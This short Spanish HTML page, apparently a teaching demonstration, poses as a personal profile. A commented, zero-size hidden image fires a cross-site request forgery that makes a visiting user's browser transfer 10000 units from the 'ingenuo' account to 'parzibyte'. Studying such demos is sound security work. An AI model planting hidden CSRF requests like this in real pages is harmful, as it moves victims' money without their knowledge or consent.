<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<title>Mi página bonita</title>
</head>
<body>
	<h1>Bienvenido a mi sitio. Aquí puedes ver mi perfil</h1>
	<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quae quam nulla aperiam repellendus iure doloribus. Excepturi reiciendis minima, earum, sapiente sed mollitia totam expedita ut ad ea vel itaque doloremque.</p>
	<!-- Justo aquí abajo cargamos la imagen para el ataque CSRF :-) -->
	<img src="transferir.php?desde=ingenuo&para=parzibyte&cantidad=10000" style="width: 0; height: 0;">

	<!--La imagen de abajo sí es real y no hace nada-->
	<img src="https://picsum.photos/200" alt="">
</body>
</html>